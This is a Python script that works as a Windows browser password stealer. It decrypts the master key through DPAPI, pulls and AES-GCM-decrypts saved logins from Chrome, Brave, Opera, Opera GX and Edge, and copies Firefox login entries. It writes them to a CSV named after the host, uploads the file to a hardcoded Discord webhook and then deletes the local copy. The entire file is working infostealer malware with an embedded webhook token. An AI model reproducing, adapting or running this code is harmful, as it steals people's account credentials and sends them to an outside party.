import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import socket
import requests
import time

# GLOBAL CONSTANTS
BROWSERS = {
    "Chrome": {
        "local_state": r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']),
        "path": r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']),
    },
    "Brave": {
        "local_state": r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State" % (os.environ['USERPROFILE']),
        "path": r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data" % (os.environ['USERPROFILE']),
    },
    "Opera": {
        "local_state": r"%s\AppData\Roaming\Opera Software\Opera Stable\Local State" % (os.environ['USERPROFILE']),
        "path": r"%s\AppData\Roaming\Opera Software\Opera Stable" % (os.environ['USERPROFILE']),
    },
    "Opera GX": {
        "local_state": r"%s\AppData\Roaming\Opera Software\Opera GX Stable\Local State" % (os.environ['USERPROFILE']),
        "path": r"%s\AppData\Roaming\Opera Software\Opera GX Stable" % (os.environ['USERPROFILE']),
    },
    "Firefox": {
        "path": r"%s\AppData\Roaming\Mozilla\Firefox\Profiles" % (os.environ['USERPROFILE']),
    },
    "Edge": {
        "local_state": r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (os.environ['USERPROFILE']),
        "path": r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']),
    }
}

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1240038860205985894/qhYcRwGnxahYevjx_X-QSDQXwSj6kOSO4L_47tbHJw8sT4xo29YcWOwZuAiZnqP7XhIz"

def get_secret_key(browser_name):
    try:
        local_state_path = BROWSERS[browser_name].get("local_state")
        if not local_state_path:
            return None

        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"[ERR] {browser_name} secret key cannot be found: {e}")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print(f"[ERR] Unable to decrypt: {e}")
        return ""

def get_db_connection(db_path):
    try:
        shutil.copy2(db_path, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"[ERR] Database cannot be found: {e}")
        return None

def extract_passwords(browser_name, browser_info):
    try:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        computer_name = socket.gethostname()
        csv_filename = f'{browser_name}_decrypted_password_{computer_name}.csv'
        csv_path = os.path.join(script_dir, csv_filename)

        with open(csv_path, mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])

            secret_key = get_secret_key(browser_name)
            if not secret_key and browser_name != "Firefox":
                send_to_discord(csv_path)  # Send empty or error file to Discord
                return

            if browser_name == "Firefox":
                profiles = os.listdir(browser_info["path"])
                for profile in profiles:
                    if ".default" in profile:
                        db_path = os.path.join(browser_info["path"], profile, "logins.json")
                        if os.path.exists(db_path):
                            with open(db_path, "r", encoding="utf-8") as f:
                                logins = json.load(f)["logins"]
                            for index, login in enumerate(logins):
                                url = login["hostname"]
                                username = login["encryptedUsername"]
                                password = login["encryptedPassword"]
                                csv_writer.writerow([index, url, username, password])
            else:
                folders = [element for element in os.listdir(browser_info["path"]) if re.search("^Profile*|^Default$", element) is not None]
                for folder in folders:
                    db_path = os.path.normpath(r"%s\%s\Login Data" % (browser_info["path"], folder))
                    conn = get_db_connection(db_path)
                    if conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index, login in enumerate(cursor.fetchall()):
                            url, username, ciphertext = login
                            if url and username and ciphertext:
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                csv_writer.writerow([index, url, username, decrypted_password])
                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")
        send_to_discord(csv_path)
        time.sleep(1)  # Wait for 1 second before deleting the file
        os.remove(csv_path)
    except Exception as e:
        print(f"[ERR] {browser_name}: {e}")
        send_to_discord(csv_path)  # Send error file to Discord even if an exception occurs

def send_to_discord(file_path):
    try:
        with open(file_path, 'rb') as f:
            response = requests.post(DISCORD_WEBHOOK_URL, files={"file": f})
        if response.status_code == 204:
            print(f"Successfully sent {file_path} to Discord")
        else:
            print(f"Failed to send {file_path} to Discord, status code: {response.status_code}")
    except Exception as e:
        print(f"[ERR] Failed to send file to Discord: {e}")

if __name__ == '__main__':
    for browser_name, browser_info in BROWSERS.items():
        extract_passwords(browser_name, browser_info)
